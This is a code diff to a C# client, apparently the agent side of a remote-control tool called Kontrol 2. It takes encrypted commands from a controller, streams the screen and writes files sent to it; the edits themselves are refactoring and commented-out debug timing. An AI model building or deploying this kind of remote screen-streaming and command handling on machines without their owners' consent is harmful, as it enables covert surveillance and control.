@@ -20,14 +20,11 @@ using NAudio.CoreAudioApi;
 using NAudio.Wave;
 using DeviceId;
 using System.Speech.Synthesis;
-using Microsoft.CSharp;
 using System.Collections.Generic;
-using System.CodeDom.Compiler;
 using Microsoft.CodeAnalysis;
 using Microsoft.CodeAnalysis.CSharp;
 using Microsoft.CodeAnalysis.Emit;
 using System.Runtime.Loader;
-using System.Text.RegularExpressions;
 using System.Runtime.ExceptionServices;
 
 [assembly: log4net.Config.XmlConfigurator(Watch = true)]
@@ -334,7 +331,7 @@ namespace Kontrol_2_Client
 			Array.Copy(buffer, data, recieved);
 			//string header = Encoding.Unicode.GetString(data, 0, 4);
 			
-			new Thread(() => //Multithreaded command processing
+			new Thread(() => //Literally the laziest but quickest way to make this multithreaded, it works so i dont care!!! 
 			{
 				if (true)
 				{
@@ -343,10 +340,7 @@ namespace Kontrol_2_Client
 					{
 						cmd = Decrypt(cmd);
 					}
-					catch
-					{
-						//Send("ERROR\n" + ex.Message);
-					}
+					catch { }
 					if (fo_mode == -1) printline("Recieved: {0}", cmd); //empty check
 					if (cmd.StartsWith("getinfo-"))
 					{
@@ -967,7 +961,7 @@ namespace Kontrol_2_Client
 						{
 							case "begin_stream":
 								RemoteDekstop = true;
-								Screen_Stream(xsplit[3], captureCursor: Convert.ToBoolean(xsplit[6]), quality: int.Parse(xsplit[5]));
+								Screen_Stream(xsplit[3], captureCursor: Convert.ToBoolean(xsplit[6]), quality: byte.Parse(xsplit[5]));
 								break;
 							case "end_stream":
 								RemoteDekstop = false;
@@ -1284,7 +1278,7 @@ namespace Kontrol_2_Client
 			//print("\rSize of each audio bit: " + data.Length);
 		}
 
-		private static void Screen_Stream(string resolution, double fps = 30, int quality = 100, int screen = 0, bool captureCursor = true, bool hwacc = false)
+		private static void Screen_Stream(string resolution, double fps = 30, byte quality = 100, byte screen = 0, bool captureCursor = true, bool hwacc = false)
 		{
 			resolution = resolution.Replace(" ", "");
 			int screenWidth = Screen.AllScreens[screen].Bounds.Width;
@@ -1306,7 +1300,7 @@ namespace Kontrol_2_Client
 			{
 				if (!hwacc) 
 				{
-					Stopwatch stopwatch = new Stopwatch();
+					/*Stopwatch stopwatch = new Stopwatch();
 					Stopwatch secondsTimer = new Stopwatch();
 					double longest = 0;
 					double least = 0;
@@ -1314,11 +1308,12 @@ namespace Kontrol_2_Client
 					double average = 0;
 					double secondsPassed = 0;
 
-					long frames = 0;
+					long frames = 0; */
+					ImageConverter converter = new ImageConverter();
 					while (RemoteDekstop)
 					{
-						stopwatch.Start();
-						secondsTimer.Start();
+						/*stopwatch.Start();
+						secondsTimer.Start();*/
 
 						using (Bitmap bm = new Bitmap(screenWidth, screenHeight, System.Drawing.Imaging.PixelFormat.Format32bppArgb))
 						{
@@ -1347,9 +1342,9 @@ namespace Kontrol_2_Client
 									}
 								}
 
-								frames++;
+								//frames++;
 
-								byte[] imageBytes = CompressBitmap(bm, quality);
+								byte[] imageBytes = CompressBitmap(bm, quality); // 18%
 
 								byte[] header = uniEncoder.GetBytes("servmod^scstream");
 								byte[] data = new byte[imageBytes.Length + 32];
@@ -1360,7 +1355,7 @@ namespace Kontrol_2_Client
 								_clientSocket.Send(data, 0, data.Length, SocketFlags.None);
 
 
-								current = stopwatch.ElapsedMilliseconds;
+								/*current = stopwatch.ElapsedMilliseconds;
 								if (longest == 0 && least == 0)
 								{
 									longest = current;
@@ -1376,16 +1371,16 @@ namespace Kontrol_2_Client
 									secondsPassed = secondsTimer.ElapsedMilliseconds / 1000;
 								}
 
-								fps = frames / secondsPassed;
+								fps = frames / secondsPassed;*/
 
-								printline();
+								/*printline();
 								printline("Average Frame time: {0}ms", current);
 								printline("Average frame size: {0}bytes", imageBytes.Length);
 								printline("FPS: {0}", fps.ToString("0.00"));
 								printline("Frames: {0}", frames);
 								printline("Seconds Passed: {0}", secondsPassed.ToString("0.00"));
 								printline("Resolution: {0}", resolution);
-								Console.SetCursorPosition(0, Console.CursorTop - 7);
+								Console.SetCursorPosition(0, Console.CursorTop - 7);*/
 							}
 						}
 					}
@@ -1440,7 +1435,7 @@ namespace Kontrol_2_Client
 			}
 		}
 
-		public static void DownloadFile(byte[] data, int count)
+		private static void DownloadFile(byte[] data, int count)
 		{
 			Console.Write($"\rRecieved: {data.Length} fo_writeSize: {fo_writeSize} fo_size: {fo_size}");
 			Buffer.BlockCopy(data, 0, fileBuffer, fo_writeSize, count);
@@ -1461,7 +1456,7 @@ namespace Kontrol_2_Client
 			Send($"file_operation\ndfprog\n{fo_writeSize}");
 		}
 		//https://www.codeproject.com/Articles/2941/Resizing-a-Photographic-image-with-GDI-for-NET
-		static Bitmap Resize(Bitmap imgPhoto, int Width, int Height)
+		private static Bitmap Resize(Bitmap imgPhoto, int Width, int Height)
 		{
 			int sourceWidth = imgPhoto.Width;
 			int sourceHeight = imgPhoto.Height;
